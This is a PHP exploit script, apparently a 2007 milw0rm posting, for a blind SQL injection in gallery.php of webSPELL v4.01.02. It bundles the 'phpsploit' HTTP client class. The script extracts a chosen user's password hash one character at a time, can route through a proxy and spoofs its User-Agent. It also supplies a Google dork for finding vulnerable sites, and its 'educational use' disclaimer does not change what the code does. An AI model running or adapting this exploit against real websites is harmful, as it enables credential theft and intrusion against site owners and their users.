<?php

//webSPELL SQL-injection exploit in gallery.php
$xpl = new phpsploit();
$xpl->allowredirection(1);
$xpl->cookiejar(1);

function istrue($xpl,$host,$path,$prefix,$gid,$pid,$uid,$i,$h){
	$xpl->get("http://".$host.$path."gallery.php?action=window&galleryID=".$gid."&picID=".$pid."%20AND%20MID((SELECT%20password%20FROM%20".$prefix."user%20WHERE%20userID=".$uid."),".$i.",1)=CHAR(".$h.")");
	$response=$xpl->getcontent();
	$regex='/<html><head><title>webSPELL Diashow: (.+?)<\/title>/';
	if (preg_match($regex,$response)) {
		return true;
	}
	else return false;
}
if($_SERVER['argc']==7 or $_SERVER['argc']==8){
	$host=$_SERVER['argv'][1];
	$path=$_SERVER['argv'][2];
	$prefix=$_SERVER['argv'][3];
	$gid=$_SERVER['argv'][4];
	$pid=$_SERVER['argv'][5];
	$uid=$_SERVER['argv'][6];
	if($_SERVER['argc']==8){
		$proxy=$_SERVER['argv'][7];
		echo "Proxy: $proxy \n";
		$xpl->proxy($proxy);	
	}
	$xpl->agent('Internet Explorer');
	echo"exploiting...\n";
	echo"md5-hash: ";
	for ($i=1;$i<=32;$i++){
		$found=false;
		$h=48;
		while (!$found and $h<=57) {
			if(istrue($xpl,$host,$path,$prefix,$gid,$pid,$uid,$i,$h)){
				$found=true;
				echo chr($h);
			}
			$h++;
		}
		if(!$found){
			$h=97;
			while (!$found and $h<=122) {
				if(istrue($xpl,$host,$path,$prefix,$gid,$pid,$uid,$i,$h)){
					$found=true;
					echo chr($h);
				}
				$h++;
			}
		}
	}
}
else{
	echo"\n\n";
	echo"|=======webSPELL v4.01.02 gallery.php SQL Injection========\n";
	echo"|\n";
	echo"|Syntax: php ".$_SERVER['argv'][0]." [host] [path] [prefix] [valid GalleryID] [valid PicID] [valid UserID] ([Proxy-IP:Port])\n|\n";
	echo"|Example (with Proxy): php ".$_SERVER['argv'][0]." localhost /webspell/ webs_ 1 1 1 192.168.1.1:80\n|\n";
	echo"|Example (without Proxy): php ".$_SERVER['argv'][0]." localhost /webspell/ webs_ 1 1 1\n|\n";
	echo"|Notes: This exploit works regardless of the PHP security settings (magic_quotes, register_globals)\n";
	echo"|       This exploit is only for educational use, use it on your own risk!\n";
	echo"|       Exploiting scripts without permission of the owner of the webspace is illegal!\n";
	echo"|       I'm not responsible for any resulting damage\n|\n";
	echo"|Google Dork: \"this site is using the webspell script (version: 4.01.02)\"\n|\n";
	echo"|Exploit found by r00t (rootcoding@gmail.com)\n";
}

/*
* 
* Copyright (C) darkfig
* 
* This program is free software; you can redistribute it and/or 
* modify it under the terms of the GNU General Public License 
* as published by the Free Software Foundation; either version 2 
* of the License, or (at your option) any later version. 
* 
* This program is distributed in the hope that it will be useful, 
* but WITHOUT ANY WARRANTY; without even the implied warranty of 
* MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the 
* GNU General Public License for more details. 
* 
* You should have received a copy of the GNU General Public License 
* along with this program; if not, write to the Free Software 
* Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA  02111-1307, USA.
* 
* TITLE:          PhpSploit Class
* REQUIREMENTS:   PHP 5 (remove "private", "public" if you have PHP 4)
* VERSION:        1.1
* LICENSE:        GNU General Public License
* ORIGINAL URL:   http://www.acid-root.new.fr/tools/03061230.txt
* FILENAME:       phpsploitclass.php
*
* CONTACT:        gmdarkfig@gmail.com (french / english)
* GREETZ:         Sparah, Ddx39
*
* DESCRIPTION:
* The phpsploit is a class implementing a web user agent.
* You can add cookies, headers, use a proxy server with (or without) a
* basic authentification. It supports the GET and the POST method. It can
* also be used like a browser with the cookiejar() function (which allow
* a server to add several cookies for the next requests) and the
* allowredirection() function (which allow the script to follow all
* redirections sent by the server). It can return the content (or the
* headers) of the request. Others useful functions can be used for debugging.
* A manual is actually in development but to know how to use it, you can
* read the comments.
*
* CHANGELOG:
* [2006-12-31] (1.1)
*  * Bug #1 fixed: Problem concerning the allowredirection() function (chr(13) bug)
*  * New: You can now call the getheader() / getcontent() function without parameters
*
* [2006-12-30] (1.0)
*  * First version
* 
*/

class phpsploit {

	/**
	* This function is called by the get()/post() functions.
	* You don't have to call it, this is the main function.
	*
	* @return $server_response
	*/
	private function sock()
	{
		if(!empty($this->proxyhost) && !empty($this->proxyport)) $socket = fsockopen($this->proxyhost,$this->proxyport);
		else $socket = fsockopen($this->host,$this->port);
		
		if(!$socket) die("Error: The host doesn't exist");
		
		if($this->method==="get") $this->packet = "GET ".$this->url." HTTP/1.1\r\n";
		elseif($this->method==="post") $this->packet = "POST ".$this->url. " HTTP/1.1\r\n";
		else die("Error: Invalid method");
		
		if(!empty($this->proxyuser)) $this->packet .= "Proxy-Authorization: Basic ".base64_encode($this->proxyuser.":".$this->proxypass)."\r\n";
		$this->packet .= "Host: ".$this->host."\r\n";
		
		if(!empty($this->agent))  $this->packet .= "User-Agent: ".$this->agent."\r\n";
		if(!empty($this->header)) $this->packet .= $this->header."\r\n";
		if(!empty($this->cookie)) $this->packet .= "Cookie: ".$this->cookie."\r\n";
		
		$this->packet .= "Connection: Close\r\n";
		if($this->method==="post")
		{
			$this->packet .= "Content-Type: application/x-www-form-urlencoded\r\n";
			$this->packet .= "Content-Length: ".strlen($this->data)."\r\n\r\n";
			$this->packet .= $this->data."\r\n";
		}
		$this->packet .= "\r\n";
		$this->recv = '';
		
		fputs($socket,$this->packet);
		while(!feof($socket)) $this->recv .= fgets($socket);
		fclose($socket);
		
		if($this->cookiejar) $this->cookiejar($this->getheader($this->recv));
		if($this->allowredirection) return $this->allowredirection($this->recv);
		else return $this->recv;
	}
	

	/**
	* This function allows you to add several cookie in the
	* request. Several methods are supported:
	* 
	* $this->addcookie("name","value");
	* or
	* $this->addcookie("name=newvalue");
	* or
	* $this->addcookie("othername=overvalue; xx=zz; y=u");
	* 
	* @param string $cookiename
	* @param string $cookievalue
	* 
	*/
	public function addcookie($cookn,$cookv='')
	{
		// $this->addcookie("name","value"); work avec replace
		if(!empty($cookv))
		{
			if($cookv === "deleted") $cookv=''; // cookiejar(1) && Set-Cookie: name=delete
			if(!empty($this->cookie))
			{
				if(preg_match("/$cookn=/",$this->cookie))
				{
					$this->cookie = preg_replace("/$cookn=(\S*);/","$cookn=$cookv;",$this->cookie);
				}
				else
				{
					$this->cookie .= " ".$cookn."=".$cookv.";"; // " ".
				}
			}
			else
			{
				$this->cookie = $cookn."=".$cookv.";";
			}
		}
		// $this->addcookie("name=value; othername=othervalue");
		else
		{
			if(!empty($this->cookie))
			{
				$cookn = preg_replace("/(.*);$/","$1",$cookn);
				$cookarr = explode(";",str_replace(" ", "",$cookn));
				for($i=0;$i<count($cookarr);$i++)
				{
					preg_match("/(\S*)=(\S*)/",$cookarr[$i],$matches);
					$cookn = $matches[1];
					$cookv = $matches[2];
					$this->addcookie($cookn,$cookv);
				}
			}
			else
			{
				$cookn = ((substr($cookn,(strlen($cookn)-1),1))===";") ? $cookn : $cookn.";";
				$this->cookie = $cookn;			
			}
		}
	}
	
	
	/**
	* This function allows you to add several headers in the
	* request. Several methods are supported:
	*
	* $this->addheader("headername","headervalue");
	* or
	* $this->addheader("headername: headervalue");
	*
	* @param string $headername
	* @param string $headervalue
	*/
	public function addheader($headern,$headervalue='')
	{
		// $this->addheader("name","value");
		if(!empty($headervalue))
		{
			if(!empty($this->header))
			{
				if(preg_match("/$headern:/",$this->header))
				{
					$this->header = preg_replace("/$headern: (\S*)/","$headern: $headervalue",$this->header);
				}
				else
				{
					$this->header .= "\r\n".$headern.": ".$headervalue;
				}
			}
			else
			{
				$this->header=$headern.": ".$headervalue;
			}
		}
		// $this->addheader("name: value");
		else 
		{
			if(!empty($this->header))
			{
				$headarr = explode(": ",$headern);
				$headern = $headarr[0];
				$headerv = $headarr[1];
				$this->addheader($headern,$headerv);
			}
			else
			{
				$this->header=$headern;
			}
		}
	}
	

	/**
	* This function allows you to use an http proxy server.
	* Several methods are supported:
	* 
	* $this->proxy("proxyip","8118");
	* or
	* $this->proxy("proxyip:8118")
	*
	* @param string $proxyhost
	* @param integer $proxyport
	*/
	public function proxy($proxy,$proxyp='')
	{
		// $this->proxy("localhost:8118");
		if(empty($proxyp))
		{
			preg_match("/^(\S*):(\d+)$/",$proxy,$proxarr);
			$proxh = $proxarr[1];
			$proxp = $proxarr[2];
			$this->proxyhost=$proxh;
			$this->proxyport=$proxp;
		}
		// $this->proxy("localhost",8118);
		else 
		{
			$this->proxyhost=$proxy;
			$this->proxyport=intval($proxyp);
		}
		if($this->proxyport > 65535) die("Error: Invalid port number");
	}
	

	/**
	* This function allows you to use an http proxy server
	* which requires a basic authentification. Several
	* methods are supported:
	* 
	* $this->proxyauth("darkfig","dapasswd");
	* or
	* $this->proxyauth("darkfig:dapasswd");
	*
	* @param string $proxyuser
	* @param string $proxypass
	*/
	public function proxyauth($proxyauth,$proxypasse='')
	{
		// $this->proxyauth("darkfig:password");
		if(empty($proxypasse))
		{
			preg_match("/^(.*):(.*)$/",$proxyauth,$proxautharr);
			$proxu = $proxautharr[1];
			$proxp = $proxautharr[2];
			$this->proxyuser=$proxu;
			$this->proxypass=$proxp;
		}
		// $this->proxyauth("darkfig","password");
		else
		{
			$this->proxyuser=$proxyauth;
			$this->proxypass=$proxypasse;
		}
	}

	
	/**
	* This function allows you to set the "User-Agent" header.
	* Several methods are possible to do that:
	* 
	* $this->agent("Mozilla Firefox");
	* or
	* $this->addheader("User-Agent: Mozilla Firefox");
	* or
	* $this->addheader("User-Agent","Mozilla Firefox");
	* 
	* @param string $useragent
	*/
	public function agent($useragent)
	{
		$this->agent=$useragent;
	}

	
	/**
	* This function returns the header which will be
	* in the next request.
	* 
	* $this->showheader();
	*
	* @return $header
	*/
	public function showheader()
	{
		return $this->header;
	}

	
	/**
	* This function returns the cookie which will be
	* in the next request.
	* 
	* $this->showcookie();
	*
	* @return $storedcookies
	*/
	public function showcookie()
	{
		return $this->cookie;
	}

	
	/**
	* This function returns the last formed
	* http request (the http packet).
	* 
	* $this->showlastrequest();
	* 
	* @return $last_http_request
	*/
	public function showlastrequest()
	{
		return $this->packet;
	}
	
	
	/**
	* This function sends the formed http packet with the
	* GET method. You can precise the port of the host.
	* 
	* $this->get("http://localhost");
	* $this->get("http://localhost:888/xd/tst.php");
	* 
	* @param string $urlwithpath
	* @return $server_response
	*/
	public function get($url)
	{
		$this->target($url);
		$this->method="get";
		return $this->sock();
	}

	
	/**
	* This function sends the formed http packet with the
	* POST method. You can precise the port of the host.
	* 
	* $this->post("http://localhost/index.php","admin=1&user=dark");
	*
	* @param string $urlwithpath
	* @param string $postdata
	* @return $server_response
	*/	
	public function post($url,$data)
	{
		$this->target($url);
		$this->method="post";
		$this->data=$data;
		return $this->sock();
	}

	
	/**
	* This function returns the content of the server response
	* without the headers.
	* 
	* $this->getcontent($this->get("http://localhost/"));
	* or
	* $this->getcontent();
	*
	* @param string $server_response
	* @return $onlythecontent
	*/
	public function getcontent($code='')
	{
		if(empty($code)) $code = $this->recv;
		$content = explode("\n",$code);
		$onlycode = '';
		for($i=1;$i<count($content);$i++)
		{
			if(!preg_match("/^(\S*):/",$content[$i])) $ok = 1;
			if($ok) $onlycode .= $content[$i]."\n";
		}
		return $onlycode;
	}

	
	/**
	* This function returns the headers of the server response
	* without the content.
	* 
	* $this->getheader($this->post("http://localhost/x.php","x=1&z=2"));
	* or
	* $this->getheader();
	*
	* @param string $server_response
	* @return $onlytheheaders
	*/
	public function getheader($code='')
	{
		if(empty($code)) $code = $this->recv;
		$header = explode("\n",$code);
		$onlyheader = $header[0]."\n";
		for($i=1;$i<count($header);$i++)
		{
			if(!preg_match("/^(\S*):/",$header[$i])) break;
			$onlyheader .= $header[$i]."\n";
		}
		return $onlyheader;
	}

	
	/**
	* This function is called by the cookiejar() function.
	* It adds the value of the "Set-Cookie" header in the "Cookie"
	* header for the next request. You don't have to call it.
	* 
	* @param string $server_response
	*/
	private function getcookie($code)
	{
		$carr = explode("\n",str_replace("\r\n","\n",$code));
		for($z=0;$z<count($carr);$z++)
		{
			if(preg_match("/set-cookie: (.*)/i",$carr[$z],$cookarr))
			{
				$cookie[] = preg_replace("/expires=(.*)(GMT||UTC)(\S*)$/i","",preg_replace("/path=(.*)/i","",$cookarr[1]));
			}
		}

		for($i=0;$i<count($cookie);$i++)
		{
			preg_match("/(\S*)=(\S*);/",$cookie[$i],$matches);
			$cookn = $matches[1];
			$cookv = $matches[2];
			$this->addcookie($cookn,$cookv);
		}
	}

	
	/**
	* This function is called by the get()/post() functions.
	* You don't have to call it.
	*
	* @param string $urltarg
	*/
	private function target($urltarg)
	{
		if(!preg_match("/^http:\/\/(.*)\//",$urltarg)) $urltarg .= "/";
		$this->url=$urltarg;
		
		$array = explode("/",str_replace("http://","",preg_replace("/:(\d+)/","",$urltarg)));
		$this->host=$array[0];

		preg_match("/:(\d+)\//",$urltarg,$matches);
		$this->port=empty($matches[1]) ? 80 : $matches[1];
		
		$temp = str_replace("http://","",preg_replace("/:(\d+)/","",$urltarg));
		preg_match("/\/(.*)\//",$temp,$matches);
		$this->path=str_replace("//","/","/".$matches[1]."/");
		
		if($this->port > 65535) die("Error: Invalid port number");
	}
	
	
	/**
	* If you call this function, the script will
	* extract all "Set-Cookie" headers values
	* and it will automatically add them into the "Cookie" header
	* for all next requests.
	*
	* $this->cookiejar(1); // enabled
	* $this->cookiejar(0); // disabled
	* 
	*/
	public function cookiejar($code)
	{
		if($code===0) $this->cookiejar='';
		if($code===1) $this->cookiejar=1;
		else
		{
			$this->getcookie($code);
		}
	}


	/**
	* If you call this function, the script will
	* follow all redirections sent by the server.
	* 
	* $this->allowredirection(1); // enabled
	* $this->allowredirection(0); // disabled
	* 
	* @return $this->get($locationresponse)
	*/
	public function allowredirection($code)
	{
		if($code===0) $this->allowredirection='';
		if($code===1) $this->allowredirection=1;
		else
		{
			if(preg_match("/(location|content-location|uri): (.*)/i",$code,$codearr))
			{
				$location = str_replace(chr(13),'',$codearr[2]);
				if(!eregi("://",$location))
				{
					return $this->get("http://".$this->host.$this->path.$location);
				}
				else
				{
					return $this->get($location);
				}
			}
			else
			{
				return $code;
			}
		}
	}
	
	
	/**
	* This function allows you to reset some parameters:
	* 
	* $this->reset(header); // headers cleaned
	* $this->reset(cookie); // cookies cleaned
	* $this->reset();       // clean all parameters
	*
	* @param string $func
	*/
	public function reset($func='')
	{
		switch($func)
		{
		case "header":
			$this->header='';
			break;
			
		case "cookie":
			$this->cookie='';
			break;
			
		default:
			$this->cookiejar='';
			$this->header='';
			$this->cookie='';
			$this->allowredirection=''; 
			$this->agent='';
			break;
		}
	}
}

?>

# milw0rm.com [2007-01-21]